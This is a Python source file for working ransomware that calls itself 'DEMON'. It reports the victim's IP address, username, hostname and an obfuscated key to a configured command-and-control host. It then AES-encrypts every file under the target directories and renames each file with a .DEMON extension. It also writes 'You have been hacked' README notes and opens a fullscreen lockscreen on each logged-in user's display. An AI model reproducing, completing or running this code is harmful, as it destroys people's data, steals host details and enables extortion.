# emacs this is -*-python-*-

import getpass
import subprocess
import yaml
import pwd, os, sys, socket, string, random, platform, threading, time
from pathlib import Path
from Crypto import Random
from Crypto.Cipher import AES
import argparse

import gui

live = True


def get_config():
    bundle_dir = getattr(sys, "_MEIPASS", os.path.abspath(os.path.dirname(__file__)))
    data_path = os.path.abspath(os.path.join(bundle_dir, "data.yml"))

    with open(data_path, "r") as stream:
        try:
            config = yaml.safe_load(stream)
        except yaml.YAMLError as exc:
            print(exc)
            config = {
                "keyupload_host": "127.0.0.1",
                "keyupload_port": "80",
                "target_dirs": ["/var/lib/grafana"],
                "message": "You have been hacked",
            }
    return config


global CONFIG
CONFIG = get_config()


def panic(message, exit_code=1):
    """Print an error message to stderr and exit"""
    print(message, file=sys.stderr)
    sys.exit(exit_code)


def start_gui(display):
    os.environ["DISPLAY"] = display
    # GUI: creates the tkinter application and canvas
    app = gui.App()
    myapp = gui.mainwindow(app, CONFIG)

    # makes fullscreen
    step = app.attributes("-fullscreen", True)

    # first update
    myapp.update_idletasks()
    myapp.update()

    print("starting lockscreen")
    gui.lock_screen(myapp, True)
    myapp.mainloop()


def getlocalip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
    return "".join(random.choice(chars) for _ in range(size))


# Encryption
def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def encrypt_file(file_name, key):
    with open(file_name, "rb") as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)

    with open(file_name, "wb") as fo:
        fo.write(enc)
    os.rename(file_name, file_name + ".DEMON")


# key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
rkey = "1d5e201b65f06a9a5799cc2aefe77137"
rkey = rkey.encode("utf-8")

global os_platform
global name
os_platform = platform.system()
hostname = platform.node()


def get_target():
    # TARGET IS ALLWAYS ROOT
    return "/"


def start_encrypt(p, key):
    print("encrypting")
    c = 0

    dirs = CONFIG["target_dirs"]
    exclude_ext = [".DEMON"]

    try:
        for x in dirs:
            target = p + x + "/"

            for path, subdirs, files in os.walk(target):
                for name in files:
                    for i in exclude_ext:
                        if not name.lower().endswith(i.lower()):
                            try:
                                if live:
                                    encrypt_file(os.path.join(path, name), key)
                                c += 1
                            except:
                                pass

                try:
                    with open(path + "/README.txt", "w") as f:
                        f.write(CONFIG["message"])
                        f.close()
                except Exception as e:
                    pass

    except Exception as e:
        pass  # continue if error


# this is caesar encoding
def get_uid(uid, index):
    uid = uid.decode()
    return "".join(
        [
            string.ascii_lowercase[:26][
                (string.ascii_lowercase[:26].find(c) + index) % 26
            ]
            if c.isalpha()
            else c
            for c in uid
        ]
    ).encode("utf-8")


def connector():
    server = socket.socket(socket.AF_INET)
    server.settimeout(10)

    try:
        # Send Key
        server.connect((CONFIG["keyupload_host"], CONFIG["keyupload_port"]))
        msg = "%s$%s$%s$%s$%s" % (
            getlocalip(),
            os_platform,
            get_uid(rkey, 10),
            getpass.getuser(),
            hostname,
        )
        server.send(msg.encode("utf-8"))

    except Exception as e:
        pass  # continue if error

    finally:
        start_encrypt(get_target(), get_uid(get_uid(rkey, 10), 13))


def main():
    try:
        print("connecting to CC")
        connector()
    except KeyboardInterrupt:
        sys.exit(0)

    # dirty code this might not work on all linux systems
    # users = os.popen("/usr/bin/who -s | /usr/bin/awk -F'[[:space:]]*' '$4~/^\(:[0-9]\)$/ {gsub(/\(/,\"\",$4);gsub(/\)/,\"\",$4); print $1\",\"$4}").read()
    users = [
        l[0].decode()
        for l in [
            l.split() for l in subprocess.check_output("/usr/bin/who").splitlines()
        ]
    ]

    for user in users:
        try:
            display = subprocess.check_output(
                "/usr/bin/ps -u $(id -u {}) -o pid= | /usr/bin/xargs -I{{}} /usr/bin/cat /proc/{{}}/environ 2>/dev/null | /usr/bin/tr '\\0' '\\n' | /usr/bin/grep -m1 '^DISPLAY='".format(
                    user
                ),
                shell=True,
            )
        except subprocess.CalledProcessError:
            print("Could not find display")
            continue
        display = display.decode().split("=")[1].rstrip("\n")
        uid = pwd.getpwnam(user).pw_uid
        if os.getuid() != uid:  # check if user is already executing
            if os.getuid() == 0:  # check if we are root
                os.setuid(uid)
            # this currently works only for one user at a time, implement it with /usr/bin/su or something if you have the time
        start_gui(display)  # try to start gui


if __name__ == "__main__":
    main()
